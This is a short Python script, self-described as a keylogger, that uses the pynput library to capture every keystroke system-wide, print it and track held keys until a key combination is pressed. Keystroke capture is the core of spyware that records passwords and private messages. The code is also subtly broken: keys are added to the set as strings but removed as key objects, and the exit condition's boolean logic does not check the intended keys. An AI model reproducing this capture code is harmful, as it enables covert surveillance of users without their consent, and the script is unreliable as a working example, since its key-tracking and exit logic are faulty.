from pynput import keyboard
from datetime import datetime

held_keys = set() # set unordered unindexed no doubles

def on_press(key):
    try:
        print(key.char)
        held_keys.add('{0}'.format(key.char))
    except AttributeError:
        print('[{0}]'.format(
            key))
        held_keys.add('{0}'.format(key))
    print(held_keys)

def on_release(key):
    held_keys.discard(key)
    print(held_keys)
    if 'Key.esc' and ('Key.ctrl_l' or 'Key.ctrl') and 'Key.alt_l' in held_keys:
        print('Thank you for using this Keylogger.')
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

print(datetime.now())
